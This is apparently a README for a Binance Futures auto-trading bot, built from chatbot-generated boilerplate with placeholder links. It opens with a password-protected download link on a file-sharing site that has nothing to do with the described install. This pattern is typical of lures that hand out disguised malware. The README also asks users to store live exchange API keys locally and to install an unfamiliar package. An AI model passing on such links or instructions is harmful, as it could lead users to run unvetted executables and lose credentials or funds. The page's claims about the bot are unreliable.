
# [DOWNLOAD](https://www.4sync.com/web/directDownload/vQ0GwKNh/ucR3VkWM.b319ff3cba0a42c5ae3faf25e462a580)  
## PASSWORD: g1tsoft2025






# CryptoBot
CryptoBot
Here's a complete `README.md` for your script. It includes detailed installation steps for Python, dependencies, environment setup, and instructions to run the script.

---

````markdown
# 📈 Binance Futures Top 5 Signal Scanner & Auto Trader

This script scans the top 200 Binance USDT Futures pairs, generates trading signals based on technical indicators (EMA, MACD, RSI, Bollinger Bands), and optionally executes trades using your Binance API keys. It also produces a combined signal report as a PDF.

## ⚙️ Features

- Scans 200 Binance Futures pairs
- Generates technical signals and ranks top 5 by ROI
- Creates a combined PDF report of signals
- Executes real trades with risk-controlled settings
- Uses trailing stop loss and take-profit
- Automatically saves trade logs in JSON

---

## ✅ Requirements

- **Python** 3.10 or higher
- Binance Futures API keys (optional for live trading)

---

## 🧰 Installation

### 1. Install Python

Download and install Python from the official site:  
👉 [https://www.python.org/downloads](https://www.python.org/downloads)

During installation, check `Add Python to PATH`.

### 2. Clone or Download This Project

```bash
git clone https://github.com/yourusername/binance-top5-scanner.git
cd binance-top5-scanner
````

Or download the `.zip` and extract it.

### 3. Create and Activate a Virtual Environment (Optional but Recommended)

```bash
python -m venv venv
# Windows:
venv\Scripts\activate
# macOS/Linux:
source venv/bin/activate
```

### 4. Install Dependencies

```bash
pip install -r requirements.txt
```

If `requirements.txt` is missing, install manually:

```bash
pip install python-dotenv pandas numpy matplotlib fpdf ta-binance
```

---

## 🔐 Environment Setup

Create a `.env` file in the root folder and paste your Binance API credentials:

```
# .env
MODE=live
BINANCE_API_KEY=your_api_key_here
BINANCE_API_SECRET=your_secret_here
```

> ⚠️ If no API keys are provided, the bot runs in **backtest mode** (no trades are placed).

---

## 🚀 How to Run

```bash
python your_script_name.py
```

It will:

* Scan symbols on Binance Futures
* Generate trading signals
* Save top 5 and others in a PDF report in `/output/reports`
* Save each trade log as JSON in `/output/trades`
* Place real trades **if API keys are provided**

---

## 📂 Output Files

* `/output/reports/` — Combined PDF signal reports
* `/output/trades/` — JSON logs of executed trades

---

## ⚠️ Risk Management & Config

| Setting           | Value         |
| ----------------- | ------------- |
| Max Risk/Trade    | 1.0 USDT      |
| Take Profit       | 0.25 USDT     |
| Stop Loss         | 0.15 USDT     |
| Leverage          | 20x           |
| Confidence Thresh | 80%           |
| Trailing SL       | 1.5% callback |

These are hardcoded in the script but can be easily edited.

---

## 📌 Notes

* Uses `matplotlib` in non-GUI (`Agg`) mode for compatibility.
* Threads up to 20 symbols in parallel.
* Supports future updates like adding charts in PDFs or more indicators.
* Built for high-speed signal scanning and automated compounding.

---

## 🧠 Coming Soon

* GUI Dashboard (HTML + JS + WebSocket)
* Chart-based reports
* Liquidation risk sniping
* AI-based signal confirmation

---

## 📞 Contact

For support or collaboration, contact:
**Scholarstica** - CryptoPilot Kenya 🇰🇪


---

## 📜 License

MIT License

```
